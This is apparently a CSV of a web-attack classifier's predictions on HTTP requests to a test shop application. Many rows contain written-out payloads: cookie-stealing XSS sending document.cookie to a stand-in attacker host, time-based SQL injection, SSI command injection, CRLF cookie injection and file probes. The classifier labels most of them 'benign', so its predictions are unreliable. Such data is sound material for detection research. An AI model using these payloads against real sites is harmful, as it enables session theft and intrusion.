row_idx,text,pred_label,max_prob
11281,METHOD=POST PATH=/tienda1/miembros/editar.jsp QUERY= PROTOCOL=HTTP/1.1,benign,0.693994402885437
11282,METHOD=GET PATH=/tienda1/miembros.INC QUERY= PROTOCOL=HTTP/1.1,benign,0.624550461769104
11283,METHOD=GET PATH=/6909030637832563290.jsp.OLD QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.38819339871406555
11284,METHOD=GET PATH=/iissamples/dfault/samples.asp QUERY= PROTOCOL=HTTP/1.1,command_exec,0.36604243516921997
11285,METHOD=GET PATH=/tienda1/publico/anadir.jsp QUERY=id=3&nombre=Vino+Rioja&precio=100&cantidad=1sessionid%3D12312312%26+username%3D%3Cscript%3Edocument.location%3D%27http%3A%2F%2Fhacker+.example.com%2Fcgi-bin%2Fcookiesteal.cgi%3F%27%2B+document.cookie%3C%2Fscript%3E&B1=A%F1adir+al+carrito PROTOCOL=HTTP/1.1,benign,0.7608138918876648
11286,METHOD=POST PATH=/tienda1/publico/anadir.jsp QUERY= PROTOCOL=HTTP/1.1,benign,0.41286852955818176
11287,METHOD=GET PATH=/tienda1/publico/anadir.jsp QUERY=id=3&nombre=paros%2522%2Bstyle%253D%2522background%253Aurl%2528javascript%253Aalert%2528%2527Paros%2527%2529%2529%26id%3D2&precio=100&cantidad=1&B1=A%F1adir+al+carrito PROTOCOL=HTTP/1.1,benign,0.7725476026535034
11288,METHOD=POST PATH=/tienda1/publico/anadir.jsp QUERY= PROTOCOL=HTTP/1.1,benign,0.41286852955818176
11289,METHOD=GET PATH=/tienda1/publico/anadir.jsp/asf-logo-wide.gif/ QUERY= PROTOCOL=HTTP/1.1,benign,0.4550740718841553
11290,METHOD=PUT PATH=/tienda1/publico/autenticar.jsp QUERY= PROTOCOL=HTTP/1.1,benign,0.453521728515625
11291,METHOD=GET PATH=/tienda1/publico/autenticar.jsp QUERY=modo=entrar%27%2C%270%27%2C%270%27%2C%270%27%29%3Bwaitfor+delay+%270%3A0%3A15%27%3B--&login=goldstei&pwd=exp8a1%21a6a&remember=on&B1=Entrar PROTOCOL=HTTP/1.1,benign,0.82538241147995
11292,METHOD=POST PATH=/tienda1/publico/autenticar.jsp QUERY= PROTOCOL=HTTP/1.1,benign,0.4538836181163788
11293,METHOD=GET PATH=/tienda1/publico/autenticar.jsp QUERY=modo=entrar&login=goldstei&pwd=exp8a1%21a6a&remember=any%253F%250D%250ASet-cookie%253A%2BTamper%253D1041264011025374727%250D%250A&B1=Entrar PROTOCOL=HTTP/1.1,benign,0.8058854937553406
11294,METHOD=POST PATH=/tienda1/publico/autenticar.jsp QUERY= PROTOCOL=HTTP/1.1,benign,0.4538836181163788
11295,METHOD=GET PATH=/tienda1/publico/autenticar.jsp QUERY=modo=entrar&login=*shel*egey7&pwd=exp8a1%21a6a&remember=on&B1=Entrar PROTOCOL=HTTP/1.1,benign,0.8042013049125671
11296,METHOD=POST PATH=/tienda1/publico/autenticar.jsp QUERY= PROTOCOL=HTTP/1.1,benign,0.4538836181163788
11297,METHOD=GET PATH=/tienda1/publico/autenticar.jsp QUERY=modo=entrar&loginA=goldstei&pwd=exp8a1%21a6a&remember=on&B1=Entrar PROTOCOL=HTTP/1.1,benign,0.8081527948379517
11298,METHOD=POST PATH=/tienda1/publico/autenticar.jsp QUERY= PROTOCOL=HTTP/1.1,benign,0.4538836181163788
11299,METHOD=GET PATH=/tienda1/publico/autenticar.jsp/asf-logo-wide.gif.Old QUERY= PROTOCOL=HTTP/1.1,benign,0.4779932200908661
11300,METHOD=GET PATH=/tienda1/publico/caracteristicas.jsp QUERY=id=2%257C PROTOCOL=HTTP/1.1,benign,0.43245887756347656
11301,METHOD=POST PATH=/tienda1/publico/caracteristicas.jsp QUERY= PROTOCOL=HTTP/1.1,benign,0.4430347979068756
11302,METHOD=GET PATH=/tienda1/publico/caracteristicas.jsp QUERY=idA=2 PROTOCOL=HTTP/1.1,benign,0.42545053362846375
11303,METHOD=POST PATH=/tienda1/publico/caracteristicas.jsp QUERY= PROTOCOL=HTTP/1.1,benign,0.4430347979068756
11304,METHOD=GET PATH=/tienda1/asf-logo-wide.gif/ QUERY= PROTOCOL=HTTP/1.1,benign,0.3915868103504181
11305,METHOD=PUT PATH=/tienda1/publico/entrar.jsp QUERY= PROTOCOL=HTTP/1.1,benign,0.5254137516021729
11306,METHOD=GET PATH=/tienda1/publico/entrar.jsp QUERY=errorMsg=Credenciales+incorrectas%2500 PROTOCOL=HTTP/1.1,benign,0.6102746725082397
11307,METHOD=POST PATH=/tienda1/publico/entrar.jsp QUERY= PROTOCOL=HTTP/1.1,benign,0.5270307064056396
11308,METHOD=GET PATH=/tienda1/publico/entrar.jsp QUERY=errorMsgA=Credenciales+incorrectas PROTOCOL=HTTP/1.1,benign,0.5995876789093018
11309,METHOD=POST PATH=/tienda1/publico/entrar.jsp QUERY= PROTOCOL=HTTP/1.1,benign,0.5270307064056396
11310,METHOD=GET PATH=/tienda1/publico/miembros.jsp/asf-logo-wide QUERY= PROTOCOL=HTTP/1.1,benign,0.6777396202087402
11311,METHOD=GET PATH=/tienda1/publico/pagar.jsp QUERY=modo=insertar&precio=3587&B1=Pasar+por+caja%2F PROTOCOL=HTTP/1.1,benign,0.6907170414924622
11312,METHOD=POST PATH=/tienda1/publico/pagar.jsp QUERY= PROTOCOL=HTTP/1.1,benign,0.4822748005390167
11313,METHOD=GET PATH=/tienda1/publico/pagar.jsp QUERY=modoA=insertar&precio=3587&B1=Pasar+por+caja PROTOCOL=HTTP/1.1,benign,0.6826554536819458
11314,METHOD=POST PATH=/tienda1/publico/pagar.jsp QUERY= PROTOCOL=HTTP/1.1,benign,0.4822748005390167
11315,METHOD=GET PATH=/tienda1/publico/registro.jsp QUERY=modo=registro&login=yukihiko&password=10nfig318c559&nombre=Malias&apellidos=Monestel+Robaldino&email=nagy%40973.lv&dni=61037738Q&direccion=C%2F+Begonia+49+12F&ciudad=Borges+del+Camp%2C+Les&cp=37621&provincia=Guadalajara&ntc=1924133576102581&B1=Registrar%22%3E%3C%21--%23EXEC+cmd%3D%22dir+%22--%3E%3C PROTOCOL=HTTP/1.1,benign,0.9651374816894531
11316,METHOD=POST PATH=/tienda1/publico/registro.jsp QUERY= PROTOCOL=HTTP/1.1,benign,0.6005440354347229
11317,METHOD=GET PATH=/tienda1/publico/registro.jsp QUERY=modo=registro&login=%3C%21--%23include+file%3D%22archivo_secreto%22+--%3E&password=10nfig318c559&nombre=Malias&apellidos=Monestel+Robaldino&email=nagy%40973.lv&dni=61037738Q&direccion=C%2F+Begonia+49+12F&ciudad=Borges+del+Camp%2C+Les&cp=37621&provincia=Guadalajara&ntc=1924133576102581&B1=Registrar PROTOCOL=HTTP/1.1,benign,0.9577135443687439
11318,METHOD=POST PATH=/tienda1/publico/registro.jsp QUERY= PROTOCOL=HTTP/1.1,benign,0.6005440354347229
11319,METHOD=GET PATH=/tienda1/publico/registro.jsp QUERY=modo=registro&login=yukihiko&password=10nfig318c559&nombre=Malias&apellidos=Monestel+Robaldino&email=nagy%40973.lv&dni=61037738Q&direccion=C%2F+Begonia+49+12F&ciudad=Borges+del+Camp%2C+Les&cp=37621&provincia=Guadalajara&ntc=842386388568073A&B1=Registrar PROTOCOL=HTTP/1.1,benign,0.9651374816894531
11320,METHOD=POST PATH=/tienda1/publico/registro.jsp QUERY= PROTOCOL=HTTP/1.1,benign,0.6005440354347229
11321,METHOD=GET PATH=/tienda1/publico/registro.jsp QUERY=modo=registro&login=yukihiko&password=10nfig318c559&nombre=Malias&apellidos=Monestel+Robaldino&email=nagy%40973.lv&dni=61037738Q&direccion=C%2F+Begonia+49+12F&ciudad=Borges+del+Camp%2C+Les&cp=37621&provinciaA=Guadalajara&ntc=1924133576102581&B1=Registrar PROTOCOL=HTTP/1.1,benign,0.9651374816894531
11322,METHOD=POST PATH=/tienda1/publico/registro.jsp QUERY= PROTOCOL=HTTP/1.1,benign,0.6005440354347229
11323,METHOD=GET PATH=/_cti_pvt/service.cnf QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.38769328594207764
11324,METHOD=GET PATH=/tienda1/publico/vaciar.jsp QUERY=B2A=Vaciar+carrito PROTOCOL=HTTP/1.1,benign,0.5375930070877075
11325,METHOD=POST PATH=/tienda1/publico/vaciar.jsp QUERY= PROTOCOL=HTTP/1.1,benign,0.4517965614795685
11326,METHOD=GET PATH=/tienda1/global/menum.jsp/asf-logo-wide.gif/.Inc QUERY= PROTOCOL=HTTP/1.1,benign,0.43481263518333435
11327,METHOD=GET PATH=/tienda1/miembros/imagenes/.Inc QUERY= PROTOCOL=HTTP/1.1,benign,0.6102608442306519
11328,METHOD=GET PATH=/tienda1/miembros/imagenes/ogono.jpg/asf-logo-wide.gif.inc QUERY= PROTOCOL=HTTP/1.1,benign,0.5981319546699524
11329,METHOD=GET PATH=/tienda1/asf-logo-wide.gif QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.45107513666152954
11330,METHOD=GET PATH=/tienda1/miembros/editar.jsp QUERY=modo=registro&login=sriram%22+AND+%221%22%3D%221&password=PErdiDOso&nombre=Orosm%E1n&apellidos=Berzoni+Arzaluz&email=bonardo%40ciaplast.gu&dni=04932437H&direccion=Plza.+De+Los+Fueros+38%2C+&ciudad=Almenara&cp=12170&provincia=Girona&ntc=6385290381034748&B1=Registrar PROTOCOL=HTTP/1.1,benign,0.9680545330047607
11331,METHOD=POST PATH=/tienda1/miembros/editar.jsp QUERY= PROTOCOL=HTTP/1.1,benign,0.693994402885437
11332,METHOD=GET PATH=/tienda1/miembros/editar.jsp QUERY=modo=registro&login=sriram&password=PErdiDOso&nombre=Orosm%E1n&apellidos=*Dal%2Fmazzo+Bernuz&email=bonardo%40ciaplast.gu&dni=04932437H&direccion=Plza.+De+Los+Fueros+38%2C+&ciudad=Almenara&cp=12170&provincia=Girona&ntc=6385290381034748&B1=Registrar PROTOCOL=HTTP/1.1,benign,0.9641828536987305
11333,METHOD=POST PATH=/tienda1/miembros/editar.jsp QUERY= PROTOCOL=HTTP/1.1,benign,0.693994402885437
11334,METHOD=GET PATH=/tienda1/miembros/editar.jsp QUERY=modo=registro&login=sriram&password=PErdiDOso&nombre=Orosm%E1n&apellidosA=Berzoni+Arzaluz&email=bonardo%40ciaplast.gu&dni=04932437H&direccion=Plza.+De+Los+Fueros+38%2C+&ciudad=Almenara&cp=12170&provincia=Girona&ntc=6385290381034748&B1=Registrar PROTOCOL=HTTP/1.1,benign,0.967206597328186
11335,METHOD=POST PATH=/tienda1/miembros/editar.jsp QUERY= PROTOCOL=HTTP/1.1,benign,0.693994402885437
11336,METHOD=GET PATH=/tienda1/miembros.BAK QUERY= PROTOCOL=HTTP/1.1,benign,0.6025556325912476
11337,METHOD=GET PATH=/IISSamples/sdk/asp/docs/ColorPicker.asp QUERY= PROTOCOL=HTTP/1.1,benign,0.39816731214523315
11338,METHOD=GET PATH=/tienda1/imagenes/1.gif/asf-logo-wide.gif/.BAK QUERY= PROTOCOL=HTTP/1.1,benign,0.43710818886756897
11339,METHOD=GET PATH=/asf-logo-wide.gif/.Old QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.45513519644737244
11340,METHOD=GET PATH=/techniques/servlets/index.html QUERY= PROTOCOL=HTTP/1.1,benign,0.44659140706062317
11341,METHOD=GET PATH=/tienda1/publico/anadir.jsp QUERY=id=1%2B&nombre=Queso+Manchego&precio=39&cantidad=15&B1=A%F1adir+al+carrito PROTOCOL=HTTP/1.1,benign,0.6943767070770264
11342,METHOD=POST PATH=/tienda1/publico/anadir.jsp QUERY= PROTOCOL=HTTP/1.1,benign,0.41286852955818176
11343,METHOD=GET PATH=/tienda1/publico/anadir.jsp QUERY=id=1&nombre=Queso+Manchego&precio=100%2F&cantidad=15&B1=A%F1adir+al+carrito PROTOCOL=HTTP/1.1,benign,0.6865071058273315
11344,METHOD=POST PATH=/tienda1/publico/anadir.jsp QUERY= PROTOCOL=HTTP/1.1,benign,0.41286852955818176
11345,METHOD=GET PATH=/tienda1/publico/anadir.jsp.java QUERY= PROTOCOL=HTTP/1.1,benign,0.4366498589515686
11346,METHOD=GET PATH=/tienda1/publico/autenticar.jsp QUERY=modo=entrar&login=eckstein&pwd=requeridor&remember=on&B1=%27%3Bwaitfor+delay+%270%3A0%3A15%27%3B-- PROTOCOL=HTTP/1.1,benign,0.8114278316497803
11347,METHOD=POST PATH=/tienda1/publico/autenticar.jsp QUERY= PROTOCOL=HTTP/1.1,benign,0.4538836181163788
11348,METHOD=GET PATH=/tienda1/publico/autenticar.jsp QUERY=modo=entrar&login=eckstein&pwd=%2F%2Fpl%2C3730n72&remember=on&B1=Entrar PROTOCOL=HTTP/1.1,benign,0.7855480313301086
11349,METHOD=POST PATH=/tienda1/publico/autenticar.jsp QUERY= PROTOCOL=HTTP/1.1,benign,0.453883558511734
11350,METHOD=GET PATH=/tienda1/publico/autenticar.jsp QUERY=modo=entrar&login=eckstein&pwd=requeridor&rememberA=on&B1=Entrar PROTOCOL=HTTP/1.1,benign,0.8059084415435791
11351,METHOD=POST PATH=/tienda1/publico/autenticar.jsp QUERY= PROTOCOL=HTTP/1.1,benign,0.4538836181163788
11352,METHOD=GET PATH=/tienda1/publico/caracteristicas.jsp QUERY=id=any%253F%250D%250ASet-cookie%253A%2BTamper%253D1041264011025374727%250D%250A PROTOCOL=HTTP/1.1,benign,0.5579200387001038
11353,METHOD=POST PATH=/tienda1/publico/caracteristicas.jsp QUERY= PROTOCOL=HTTP/1.1,benign,0.4430347979068756
11354,METHOD=GET PATH=/tienda1/publico/caracteristicas.jsp QUERY=idA=2 PROTOCOL=HTTP/1.1,benign,0.42545053362846375
11355,METHOD=POST PATH=/tienda1/publico/caracteristicas.jsp QUERY= PROTOCOL=HTTP/1.1,benign,0.4430347979068756
11356,METHOD=GET PATH=/tienda1/publico/entrar.jsp QUERY=errorMsg=Credenciales+incorrectas%22+AND+%221%22%3D%221 PROTOCOL=HTTP/1.1,benign,0.6146330237388611
11357,METHOD=POST PATH=/tienda1/publico/entrar.jsp QUERY= PROTOCOL=HTTP/1.1,benign,0.5270307064056396
11358,METHOD=GET PATH=/tienda1/publico/entrar.jsp QUERY=errorMsg=sessionid%3D12312312%26+username%3D%253C%2573%2563%2572%2569%2570%2574%253E%2564%256F%2563%2575%256D%2565%256E%2574%252E%256C%256F%2563%2561%2574%2569%256F%256E%253D%2527%2568%2574%2574%2570%253A%252F%252F%2561%2574%2574%2561%2563%256B%2565%2572%2568%256F%2573%2574%252E%2565%2578%2561%256D%2570%256C%2565%252F%2563%2567%2569%252D%2562%2569%256E%252F%2563%256F%256F%256B%2569%2565%2573%2574%2565%2561%256C%252E%2563%2567%2569%253F%2527%252B%2564%256F%2563%2575%256D%2565%256E%2574%252E%2563%256F%256F%256B%2569%2565%253C%252F%2573+%2563%2572%2569%2570%2574%253E%3F PROTOCOL=HTTP/1.1,benign,0.7626643180847168
11359,METHOD=POST PATH=/tienda1/publico/entrar.jsp QUERY= PROTOCOL=HTTP/1.1,benign,0.5270307064056396
11360,METHOD=GET PATH=/tienda1/publico.old QUERY= PROTOCOL=HTTP/1.1,benign,0.3892906606197357
11361,METHOD=GET PATH=/tienda1/publico/pagar.jsp QUERY=modo=insertar%253CSCRIPT%253Ealert%2528%2522Paros%2522%2529%253B%253C%252FSCRIPT%253E&precio=5003&B1=Confirmar PROTOCOL=HTTP/1.1,benign,0.7795525193214417
11362,METHOD=POST PATH=/tienda1/publico/pagar.jsp QUERY= PROTOCOL=HTTP/1.1,benign,0.4822748005390167
11363,METHOD=GET PATH=/tienda1/publico/pagar.jsp QUERY=modo=insertar&precio=bob%2540%253CSCRipt%253Ealert%2528Paros%2529%253C%252FscrIPT%253E.parosproxy.org&B1=Confirmar PROTOCOL=HTTP/1.1,benign,0.7759279012680054
11364,METHOD=POST PATH=/tienda1/publico/pagar.jsp QUERY= PROTOCOL=HTTP/1.1,benign,0.4822748005390167
11365,METHOD=GET PATH=/tienda1/publico/pagar.jsp QUERY=modo=insertar&precio=5003&B1=Confirmar%2F PROTOCOL=HTTP/1.1,benign,0.6971325874328613
11366,METHOD=POST PATH=/tienda1/publico/pagar.jsp QUERY= PROTOCOL=HTTP/1.1,benign,0.4822748005390167
11367,METHOD=GET PATH=/tienda1/publico/pagar.jsp QUERY=modo=insertar&precio=5003&B1A=Confirmar PROTOCOL=HTTP/1.1,benign,0.7293931245803833
11368,METHOD=POST PATH=/tienda1/publico/pagar.jsp QUERY= PROTOCOL=HTTP/1.1,benign,0.4822748005390167
11369,METHOD=GET PATH=/tienda1/publico/pagar.jsp/asf-logo-wide QUERY= PROTOCOL=HTTP/1.1,benign,0.5575454235076904
11370,METHOD=GET PATH=/tienda1/publico/registro.jsp QUERY=modo=registro&login=%4040&password=enar0ar&nombre=Marcia&apellidos=Porteria+Estades&email=merkinson%40pintandomucho.gg&dni=05145490E&direccion=Calle+Belateko+Monasterioaren%2C+192%2C+2%3FE&ciudad=Alcal%E1+del+Obispo&cp=03794&provincia=Valencia&ntc=1153905778243481&B1=Registrar PROTOCOL=HTTP/1.1,benign,0.9664535522460938
11371,METHOD=POST PATH=/tienda1/publico/registro.jsp QUERY= PROTOCOL=HTTP/1.1,benign,0.6005440354347229
11372,METHOD=GET PATH=/tienda1/publico/registro.jsp QUERY=modo=registro&login=zadeh&password=enar0ar&nombre=Marcia&apellidos=Porteria+Estades&emailA=merkinson%40pintandomucho.gg&dni=05145490E&direccion=Calle+Belateko+Monasterioaren%2C+192%2C+2%3FE&ciudad=Alcal%E1+del+Obispo&cp=03794&provincia=Valencia&ntc=1153905778243481&B1=Registrar PROTOCOL=HTTP/1.1,benign,0.960595428943634
11373,METHOD=POST PATH=/tienda1/publico/registro.jsp QUERY= PROTOCOL=HTTP/1.1,benign,0.6005440354347229
11374,METHOD=GET PATH=/asf-logo-wide.gif/.BAK QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.4457440674304962
11375,METHOD=GET PATH=/tienda1/publico/vaciar.jsp QUERY=B2=%4040 PROTOCOL=HTTP/1.1,benign,0.4521147608757019
11376,METHOD=POST PATH=/tienda1/publico/vaciar.jsp QUERY= PROTOCOL=HTTP/1.1,benign,0.4517965614795685
11377,METHOD=GET PATH=/tienda1/publico/vaciar.jsp QUERY=B2A=Vaciar+carrito PROTOCOL=HTTP/1.1,benign,0.5375930070877075
11378,METHOD=POST PATH=/tienda1/publico/vaciar.jsp QUERY= PROTOCOL=HTTP/1.1,benign,0.4517965614795685
11379,METHOD=GET PATH=/4861362529278789730.Inc QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.4007658064365387
11380,METHOD=GET PATH=/tienda1/global/menum.jsp/asf-logo-wide.gif/~ QUERY= PROTOCOL=HTTP/1.1,benign,0.441715806722641
11381,METHOD=GET PATH=/tienda1/global/titulo.jsp.inc QUERY= PROTOCOL=HTTP/1.1,benign,0.38915857672691345
11382,METHOD=GET PATH=/tienda1.Bak QUERY= PROTOCOL=HTTP/1.1,benign,0.3849906623363495
11383,METHOD=GET PATH=/dspug.nsf QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.3445427417755127
11384,METHOD=GET PATH=/tienda1/miembros/imagenes/castro.jpg/6909030637832563290.jsp QUERY= PROTOCOL=HTTP/1.1,benign,0.7086067199707031
11385,METHOD=GET PATH=/6909030637832563290.jsp QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.34937310218811035
11386,METHOD=GET PATH=/tienda1/miembros/editar.jsp QUERY=modo=registro&login=checinsk&password=c2ad953u8ro&nombre=Neria&apellidos=Taronger&email=torgov-mattera%40yksoluap.edu&dni=74014005M&direccion=Avenida+Roque+De+Gando%2C+193%2C+7%3FE&ciudad=Castrobol&cp=26324&provincia=Cuenca&ntc=5680554856223107%3CSCRIPT%3Ealert%28%22Paros%22%29%3B%3C%2FSCRIPT%3E&B1=Registrar PROTOCOL=HTTP/1.1,benign,0.975517749786377
11387,METHOD=POST PATH=/tienda1/miembros/editar.jsp QUERY= PROTOCOL=HTTP/1.1,benign,0.693994402885437
11388,METHOD=GET PATH=/tienda1/miembros/editar.jsp QUERY=modo=registro&login=checinsk&password=c2ad953u8ro&nombre=Neria&apellidos=Taronger&email=torgov-mattera%40yksoluap.edu&dni=74014005M&direccion=Avenida+Roque+De+Gando%2C+193%2C+7%3FE&ciudad=Castrobol&cp=26324&provincia=Cuenca&ntc=5680554856223107&B1=%27%3Bwaitfor+delay+%270%3A0%3A15%27%3B-- PROTOCOL=HTTP/1.1,benign,0.975517749786377
11389,METHOD=POST PATH=/tienda1/miembros/editar.jsp QUERY= PROTOCOL=HTTP/1.1,benign,0.693994402885437
11390,METHOD=GET PATH=/tienda1/miembros/editar.jsp QUERY=modo=registro&login=checinsk&password=c2ad953u8ro&nombre=Neria&apellidos=Taronger&email=lopez_novis%40ocymafa.%40et&dni=74014005M&direccion=Avenida+Roque+De+Gando%2C+193%2C+7%3FE&ciudad=Castrobol&cp=26324&provincia=Cuenca&ntc=5680554856223107&B1=Registrar PROTOCOL=HTTP/1.1,benign,0.9757540225982666
11391,METHOD=POST PATH=/tienda1/miembros/editar.jsp QUERY= PROTOCOL=HTTP/1.1,benign,0.693994402885437
11392,METHOD=GET PATH=/tienda1/miembros/editar.jsp QUERY=modo=registro&loginA=checinsk&password=c2ad953u8ro&nombre=Neria&apellidos=Taronger&email=torgov-mattera%40yksoluap.edu&dni=74014005M&direccion=Avenida+Roque+De+Gando%2C+193%2C+7%3FE&ciudad=Castrobol&cp=26324&provincia=Cuenca&ntc=5680554856223107&B1=Registrar PROTOCOL=HTTP/1.1,benign,0.9755211472511292
11393,METHOD=POST PATH=/tienda1/miembros/editar.jsp QUERY= PROTOCOL=HTTP/1.1,benign,0.693994402885437
11394,METHOD=GET PATH=/servlet/hello QUERY= PROTOCOL=HTTP/1.1,benign,0.3798540234565735
11395,METHOD=GET PATH=/IISSamples/sdk/asp/docs/libcodebrws.inc QUERY= PROTOCOL=HTTP/1.1,command_exec,0.3531743288040161
11396,METHOD=GET PATH=/tienda1/imagenes/2.gif.inc QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.4916449189186096
11397,METHOD=GET PATH=/tienda1/imagenes/cmenbul.gif/asf-logo-wide.gif QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.4487411379814148
11398,METHOD=GET PATH=/ QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.4853888154029846
11399,METHOD=GET PATH=/CFIDE/administrator/logout.cfm QUERY= PROTOCOL=HTTP/1.1,benign,0.5263088345527649
11400,METHOD=GET PATH=/tienda1/publico/anadir.jsp QUERY=id=1&nombre=Jam%F3n+Ib%E9rico&precio=39&cantidad=57+&B1=A%F1adir+al+carrito PROTOCOL=HTTP/1.1,benign,0.697442352771759
11401,METHOD=POST PATH=/tienda1/publico/anadir.jsp QUERY= PROTOCOL=HTTP/1.1,benign,0.41286852955818176
11402,METHOD=GET PATH=/tienda1/publico/anadir.jsp QUERY=id=1&nombre=Jam%F3n+Ib%E9rico&precio=39&cantidad=57&B1=sessionid%3D12312312%26+username%3D%3Cscript%3Edocument.location%3D%27http%3A%2F%2Fhacker+.example.com%2Fcgi-bin%2Fcookiesteal.cgi%3F%27%2B+document.cookie%3C%2Fscript%3E PROTOCOL=HTTP/1.1,benign,0.773074209690094
11403,METHOD=POST PATH=/tienda1/publico/anadir.jsp QUERY= PROTOCOL=HTTP/1.1,benign,0.41286852955818176
11404,METHOD=GET PATH=/tienda1/publico/anadir.jsp QUERY=id=1%2F&nombre=Jam%F3n+Ib%E9rico&precio=39&cantidad=57&B1=A%F1adir+al+carrito PROTOCOL=HTTP/1.1,benign,0.6803790926933289
11405,METHOD=POST PATH=/tienda1/publico/anadir.jsp QUERY= PROTOCOL=HTTP/1.1,benign,0.41286852955818176
11406,METHOD=GET PATH=/tienda1/publico/anadir.jsp QUERY=idA=1&nombre=Jam%F3n+Ib%E9rico&precio=39&cantidad=57&B1=A%F1adir+al+carrito PROTOCOL=HTTP/1.1,benign,0.6897191405296326
11407,METHOD=POST PATH=/tienda1/publico/anadir.jsp QUERY= PROTOCOL=HTTP/1.1,benign,0.41286852955818176
11408,METHOD=GET PATH=/tienda1/publico/anadir.jsp.Old QUERY= PROTOCOL=HTTP/1.1,benign,0.41137635707855225
11409,METHOD=GET PATH=/tienda1/publico/autenticar.jsp QUERY=modo=entrar%27%2C%270%27%2C%270%27%29%3Bwaitfor+delay+%270%3A0%3A15%27%3B--&login=drappel&pwd=innoc52&remember=off&B1=Entrar PROTOCOL=HTTP/1.1,benign,0.806523859500885
11410,METHOD=POST PATH=/tienda1/publico/autenticar.jsp QUERY= PROTOCOL=HTTP/1.1,benign,0.4538836181163788
11411,METHOD=GET PATH=/tienda1/publico/autenticar.jsp QUERY=modo=%27+AND+%271%27%3D%271&login=drappel&pwd=innoc52&remember=off&B1=Entrar PROTOCOL=HTTP/1.1,benign,0.7477073073387146
11412,METHOD=POST PATH=/tienda1/publico/autenticar.jsp QUERY= PROTOCOL=HTTP/1.1,benign,0.4538836181163788
11413,METHOD=GET PATH=/tienda1/publico/autenticar.jsp QUERY=modo=entrar&login=drappel&pwd=innoc52&remember=on%2F&B1=Entrar PROTOCOL=HTTP/1.1,benign,0.7761222720146179
11414,METHOD=POST PATH=/tienda1/publico/autenticar.jsp QUERY= PROTOCOL=HTTP/1.1,benign,0.4538836181163788
11415,METHOD=GET PATH=/tienda1/publico/autenticar.jsp QUERY=modoA=entrar&login=drappel&pwd=innoc52&remember=off&B1=Entrar PROTOCOL=HTTP/1.1,benign,0.7675364017486572
11416,METHOD=POST PATH=/tienda1/publico/autenticar.jsp QUERY= PROTOCOL=HTTP/1.1,benign,0.4538836181163788
11417,METHOD=GET PATH=/iisadmpwd/achg.htr QUERY= PROTOCOL=HTTP/1.1,benign,0.4740259647369385
11418,METHOD=GET PATH=/tienda1/publico/caracteristicas.jsp QUERY=id=1%27INJECTED_PARAM PROTOCOL=HTTP/1.1,benign,0.4581756591796875
11419,METHOD=POST PATH=/tienda1/publico/caracteristicas.jsp QUERY= PROTOCOL=HTTP/1.1,benign,0.4430347979068756
11420,METHOD=GET PATH=/tienda1/publico/caracteristicas.jsp QUERY=idA=1 PROTOCOL=HTTP/1.1,benign,0.4123231768608093
11421,METHOD=POST PATH=/tienda1/publico/caracteristicas.jsp QUERY= PROTOCOL=HTTP/1.1,benign,0.4430347979068756
11422,METHOD=GET PATH=/tienda1/publico/entrar.jsp QUERY=errorMsg=Credenciales+incorrectas%3C%21--%23EXEC+cmd%3D%22ls+%2F%22--%3E PROTOCOL=HTTP/1.1,benign,0.5957152843475342
11423,METHOD=POST PATH=/tienda1/publico/entrar.jsp QUERY= PROTOCOL=HTTP/1.1,benign,0.5270307064056396
11424,METHOD=GET PATH=/tienda1/publico/entrar.jsp QUERY=errorMsgA=Credenciales+incorrectas PROTOCOL=HTTP/1.1,benign,0.5995876789093018
11425,METHOD=POST PATH=/tienda1/publico/entrar.jsp QUERY= PROTOCOL=HTTP/1.1,benign,0.5270307064056396
11426,METHOD=GET PATH=/tienda1/publico/entrar.jsp/4861362529278789730.OLD QUERY= PROTOCOL=HTTP/1.1,benign,0.5873923897743225
11427,METHOD=GET PATH=/tienda1/publico/pagar.jsp QUERY=modo=%3CSCRIPT%3Ealert%28%22Paros%22%29%3B%3C%2FSCRIPT%3E&precio=9353&B1=Confirmar PROTOCOL=HTTP/1.1,benign,0.7764583826065063
11428,METHOD=POST PATH=/tienda1/publico/pagar.jsp QUERY= PROTOCOL=HTTP/1.1,benign,0.4822748005390167
